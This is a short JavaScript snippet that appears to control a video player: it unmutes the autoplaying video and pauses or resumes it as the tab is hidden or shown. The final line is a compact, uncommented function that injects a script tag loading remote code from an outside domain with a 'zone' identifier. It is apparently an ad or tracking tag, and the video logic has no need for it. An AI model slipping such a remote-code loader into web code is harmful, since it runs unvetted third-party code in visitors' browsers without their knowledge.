const video = document.getElementById('video-player');

// Unmute the video when it autoplays
video.muted = false;

document.addEventListener('visibilitychange', function() {
  if (document.hidden) {
    video.pause(); // Pause the video when the tab is minimized
  } else {
    video.play(); // Resume the video when the tab is active
  }
});

(function(s){s.dataset.zone='10444724',s.src='https://al5sm.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))